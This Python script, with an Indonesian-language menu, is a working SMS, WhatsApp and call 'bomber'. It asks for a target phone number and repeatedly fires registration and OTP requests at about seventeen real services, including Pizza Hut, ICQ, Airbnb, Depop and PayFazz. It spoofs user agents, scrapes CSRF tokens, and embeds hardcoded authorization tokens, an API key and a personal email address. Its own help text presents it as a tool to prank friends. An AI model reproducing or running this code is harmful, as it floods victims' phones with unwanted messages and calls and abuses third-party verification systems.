# Semoga, allah, melaknat orang-orang yang suka rekod sc orang, aamiin
import threading, os, sys, json
from bs4 import BeautifulSoup as bs
import requests as ru
from fake_useragent import UserAgent
from warn.warn import *
from etc.bener import *
from etc.ua import *
from etc.loding import *
class main:
 def start():
  try:
      spam.piza(nom)
      loding()
      spam.map(nom)
      loding()
      spam.mypoin(nom)
      loding()
      spam.icq(nom)
      loding()
      spam.adakami(nom)
      loding()
      spam.coowry(nom)
      loding()
      spam.iuga(nom)
      loding()
      spam.fav(nom)
      loding()
      spam.suplai(nom)
      loding()
      spam.chataja(nom)
      loding()
      spam.depop(nom)
      loding()
      spam.ruparupa(nom)
      loding()
      spam.dekoruma(nom)
      loding()
      spam.jag(nom)
      loding()
      spam.airbnb(nom)
      loding()
      spam.kelaspintar(nom)
      loding()
      spam.payfazz(nom)
  except ru.ConnectionError:print (f"{ken}[{kun}•{ken}]{kan} Koneksi Error")
  except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}]{kun} Program dihentikan")
class spam:
 def piza(nom):
    hd = {
    'user-agent': ua.random ,
    'referer': 'https://www.phd.co.id/register',
    'Host': 'api-prod.diqit.io',
    'content-type':'application/json;charset=UTF-8',
    }
    dat = {'phone':nom}
    for x in range(6):
     sia = ru.post("https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
    if 'error' in sia:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}Pizzahut{kun} Gagal")
    else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}Pizzahut{kan} OK")
 def mypoin(nom):
     url = 'https://mypoin.id/register/validate-phone-number'
     otp = 'https://mypoin.id/register/request-otp'
     r  = ru.Session()
     uat = {"user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"}
     uatp = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "102","content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://mypoin.id","referer": "https://mypoin.id/register/validate-phone-number","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","x-requested-with": "XMLHttpRequest"}
     a = r.get(url,headers=uat).text
     b = bs(a,'html.parser')
     c = b.find("input",attrs={"type":"hidden","name":"csrfmiddlewaretoken"})
     e = r.post(otp,headers=uatp,data={"phone":"62"+nom,"csrfmiddlewaretoken": c["value"]}).text
     if e == '{"status": "ok"}':
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}MyPoin{kan} OK")
     else:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}MyPoin{kun} Gagal")
 def map(nom):
    hd = {
    "Connection": "keep-alive",
    "user-agent": ua.random ,
    }
    dat = {'phone':'62'+nom}
    for x in range(5):
        pil = ru.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat,headers=hd)
    if 'error' in pil:print (f"{ken}[{kun}•{ken}] {ken}Spam {kun}({im}{kun}SMS{kun}) {ken}Mapclub{kun} Gagal")
    else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}MapClub{kan} Ok")
 def icq(nom):
    url = 'https://u.icq.net/api/v14/rapi/auth/sendCode'
    hd = {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7",
    "content-type": "application/json",
    "origin": "http://web.icq.com",
    "referer": "http://web.icq.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": ua.random ,
    }
    dat = json.dumps({"reqId":"64708-1593781791","params":{"phone":"62"+nom,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
    a = ru.post(url,headers=hd,data=dat).text
    b = json.loads(a)
    if b['status']['code'] != 20000:print(f'{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}ICQ{kun} Gagal')
    else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}ICQ{kan} OK")
 def adakami(nom):
    hd = {
        "content-type": "application/json; charset=UTF-8",
        "content-length": "34",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.8.0",
        "accept-language": "in",
        "x-ada-token": "",
        "x-ada-appid": "800006",
        "x-ada-os": "android",
        "x-ada-channel": "default",
        "x-ada-mediasource": "",
        "x-ada-agency": "adtubeagency",
        "x-ada-campaign": "AdakamiCampaign",
        "x-ada-role": "1",
        "x-ada-appversion": "1.7.0",                                                                         "x-ada-device": "",
        "x-ada-model": "SM-G935FD",
        "x-ada-os-ver": "7.1.1",                                                                             "x-ada-androidid": "a4341a2sa90a4d97",
        "x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39",
        "x-ada-afid": "1580054114839-7395423911531673296",
    }
    dat = {"ketik":0,"nomor":"0"+nom}
    datjson = json.dumps(dat)
    r = ru.Session()
    for spem in range(5):
     a = r.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=datjson,headers=hd,timeout=10).text
    if (a == '{"result":-1,"resultMessage":"Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok.","content":null}') or (a == '{"result":-1,"resultMessage":"Gagal","content":null}'):print(f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan} {ken}AdaKami{kun} Gagal")
    else:print(f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}AdaKami{kan} OK")
 def coowry(nom):
    url = 'https://www.coowry.com/arlethdesign'
    spam = 'https://www.coowry.com/api/tokens'
    hd = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-length": "28",
        "content-type": "application/json",
        "origin": "https://www.coowry.com",
        "referer": "https://www.coowry.com/arlethdesign",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ua.random
    }
    target = {"msisdn":"+62"+nom}
    jsn = json.dumps(target)
    r  = ru.Session()
    a = r.get(url,headers={'user-agent':ua.random}).cookies
    for i in range(5):
     b = r.post(spam,headers=hd,cookies={'_cwpeople_keyle_key':a["_cwpeople_key"]},data=jsn).text
    c = json.loads(b)["type"]
    if c == 'ok':print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}Coowry{kan} OK")
    else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}Coowry{kun} Gagal")
 def iuga(nom):
    pis = nom.replace("+62","")
    r  = ru.Session()
    for x in range(1):
                a = r.get('https://www.iuiga.com/register.html',headers={'user-agent':ua.random}).text
                b = bs(a,'html.parser')
                c = b.find("meta",attrs={"name":"csrf-token"})
                d = r.post('https://www.iuiga.com/login/send-register-code',headers={'user-agent':ua.random},data={"_csrf": c["content"],"phone": pis,"phone_code": "+62","is_login": "0"}).text
                if 'success' in d:
                 print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}IUGA{kan} Ok")
                else:print(f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}IUGA{kun} Gagal")
 def fav(nom):
    hd = {
"Host": "api.myfave.com",
"Connection": "keep-alive",
"x-user-agent": "Fave-PWA/v1.0.0",
"User-Agent": ua.random,
"content-type": "application/json",
"Accept": "*/*",
"Origin": "https://m.myfave.com",
"Referer": "https://m.myfave.com/jakarta/auth",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
    dat = {'phone':'62'+nom}
    x = ru.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=hd).text
    if 'error' in x:print(f"{ken}[{kun}•{ken}] {ken}Spam {kan}({anj}CAll{kan}) {ken}Fave{kun} Gagal")
    else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({anj}CALL{kan}) {ken}Fave{kan} OK")
 def suplai(nom):
    hd = {
"Host": "api.sooplai.com",                                                                           "accept": "application/json, text/plain, */*",
"User-Agent": ua.random ,
"Content-Type": "application/json",
"origin": "https://www.sooplai.com",
"referer": "https://www.sooplai.com/register",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
}
    dat = json.dumps({'phone':'62'+nom})
    for x in range(5):
      x = ru.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=hd)
    if 'error' in x:
     print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Sooplai{kun} Gagal")
    else:
     print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Sooplai{kan} OK")
 def chataja(nom):
     data = json.dumps({"user":{"app_id":"kiwari-prod","phone_number":"62"+nom}})
     a = ru.post('https://api.chataja.co.id/api/v2/auth_nonce',data=data,headers={"Accept": "application/json, text/plain, */*","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Connection": "keep-alive","Content-Length": "65","Content-Type": "application/json;charset=UTF-8","Host": "api.chataja.co.id","Origin": "https://web.chataja.co.id","Referer": "https://web.chataja.co.id/","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-site","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}).text;b = json.loads(a)["data"]
     if b:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}ChatAja{kan} OK")
     else:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}ChatAja{kun} Gagal")
 def depop(nom):
     hd = {'Host':'webapi.depop.com','content-length':'49','accept':'application/json, text/plain, */*','origin':'https://signup.depop.com','save-data':'on','user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'}
     dat = {'phone_number':nom,'country_code':'ID'}
     datjs = json.dumps(dat)
     for x in range(3):
        y = ru.put("https://webapi.depop.com/api/auth/v1/verify/phone",headers=hd,data=datjs)
     if 'error' in y.text:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Depop{kun} Gagal")
     else:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Depop{kan} OK")
 def ruparupa(nom):
     url = 'https://wapi.ruparupa.com/auth/check-otp-auth'
     url2 = 'https://wapi.ruparupa.com/auth/generate-otp'
     hdurl = {
'accept': 'application/json',
'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
'content-length': '88',
'content-type': 'application/json',                                                                                                          'origin': 'https://m.ruparupa.com',
'referer': 'https://m.ruparupa.com/my-account',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': ua.random ,
'user-platform': 'mobile',
'x-company-name': 'odi',                                                                                                                     'x-frontend-type': 'mobile',
}
     hdurl2 = {
'accept': 'application/json',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
'content-length': '103',
'content-type': 'application/json',
'origin': 'https://ruparupa.com',
'referer': 'https://ruparupa.com/verification?page=otp-choices',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': ua.random ,
'user-platform': 'mobile',
'x-company-name': 'odi',
'x-frontend-type': 'mobile',
}
     dataurl = {"phone":"0"+nom,"email":"abilseno11@gmail.com","action":"register","password":""}
     dataurljson = json.dumps(dataurl)
     dataurl2 = {"phone":"0"+nom,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0}                                    
     dataurl2json = json.dumps(dataurl2)
     a = ru.post(url,headers=hdurl,data=dataurljson).text
     b = ru.post(url2,headers=hdurl2,data=dataurl2json).text
     c = json.loads(b)
     if c['message'] == 'success':
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}WA{kan}) {ken}RupaRupa{kan} OK")
     else:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}WA{kan}) {ken}RupaRupa{kun} Gagal")
 def dekoruma(nom):
     data = json.dumps({"phoneNumber":"+62"+nom,"platform":"wa"})
     r = ru.Session()
     for x in range(1):
      cal = r.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"content-type": "application/json","user-agent":ua.random},data=data).text
     if '' in cal:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}WA{kan}) {ken}Dekoruma{kan} OK")
     else:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}WA{kan}) {ken}Dekoruma{kun} Gagal")
 def jag(nom):
     p = ru.get("https://id.jagreward.com/member/verify-mobile/"+nom)
     y = json.loads(p.text)
     if y["message"] == 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({anj}CALL{kan}) {ken}JagReward{kan} OK")
     else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({anj}CALL{kan}) {ken}JagReward{kun} Gagal")
 def airbnb(nom):
     head = {
        "Host": "www.airbnb.co.id",
        "content-length": "83",
        "device-memory": "2",
        "x-csrf-token": "V4$.airbnb.co.id$N_Kx2ju9iX8$gUBHaO73_UKCj4rDt2rHVNj7zvmZfOYgz38XKc9dzKw=",
        "x-csrf-without-token": "1",
        "user-agent": ua.random ,
        "viewport-width": "360",
        "content-type": "application/json",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "cache-control": "no-cache",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://www.airbnb.co.id",
        "referer": "https://www.airbnb.co.id/signup_login?redirect_url=/help",
        }
     dat = json.dumps({"phoneNumber": "62"+nom,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"})
     for x in range(5):
      cal = ru.post("https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id",data=dat,headers=head)
     if 'internationalPhoneNumber' in cal.text:
         print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Airbnb{kan} OK")
     else:
         print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Airbnb{kun} Gagal")
 def kelaspintar(nom):
     r = ru.Session()
     headers={
          'x-requested-with':'XMLHttpRequest',
          'User-Agent':ua.random ,
          'Referer':'https://www.kelaspintar.id/',

     }
     dat = {
          "user_mobile":nom,
          "otp_type":"send_otp_reg",
          "mobile_code":"%2B62",
     }
     x = r.post('https://www.kelaspintar.id/user/otpverification',data=dat,headers=headers).text
     if 'OTP send' in x:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}KelasPintar{kan} OK")
     else:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}KelasPintar{kun} Gagal")
 def payfazz(nom):
     hd = {'Host': 'api.payfazz.com', 'content-length': '17', 'accept': '*/*', 'origin': 'https://www.payfazz.com','user-agent': ua.random, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'http://www.payfazz.com/register/BEN6ZF74XL', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
     r = ru.Session()
     a = r.post('https://api.payfazz.com/v2/phoneVerifications', headers=hd, data={'phone': '0'+nom})
     if 'phoneVerificationId' in a.text:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}PayFazz{kan} OK")
     else:
      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}PayFazz{kun} Gagal")
try:
 os.system("clear")
 bnr()
 menu=["Mulai","Grup WhatsApp","Info Tools"]
 print (f"         {tot}MENU{sop}        ")
 for i in range(len(menu)):
  print (f"{ken} [0"+str(i+1).ljust(1)+"] \033[31m"+menu[i])
 hyu = str(input(f"{kun}[{kan}•{kun}] {im}Masukkan pilihan : "))
 if (hyu == '1') or (hyu == '01'):
  os.system("clear")
  bnr()
  nom=str(input(f"{kun}[{kan}•{kun}] {im}Masukkan nomor target (ex:88xx) : "))
  if len(nom) <= 5: print (f"{kun}[{kan}•{kun}] {kun}Mohon, masukkan no telp dengan benar");sys.exit()
  print (f"{kun}[{kan}•{kun}] {im}Target : {kon}{nom}")
  main.start(hyu)
 elif (hyu == '2') or (hyu == '02'):
  os.system("xdg-open https://chat.whatsapp.com/LqEGHqFtQBwLEUbemADmTk")
  os.system("python brutal.py")
 elif (hyu == '3') or (hyu == '03'):
  os.system("clear")
  bnr()
  print (f"          {tot}TENTANG TOOL INI{sop}   ")
  print (f"""
{kan}Tools spam all for one adalah {kon}spam brutal (sms, wa, call) yang dibuat untuk menjahili teman2 kalian
{kan}Bantu terus admin mengembangkan tools ini, dengan cara tidak merecode sc ini 'v'""")
  os.system("python brutal.py")
 else:
  print (f"{kun}[{kan}•{kun}] {kun}Masukkan pilihan dengan benar")
  os.system("python brutal.py")
except ru.ConnectionError:print (f"{ken}[{kun}•{ken}] {kun}Koneksi Error")
except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}] {kun}Program dihentikkan paksa")
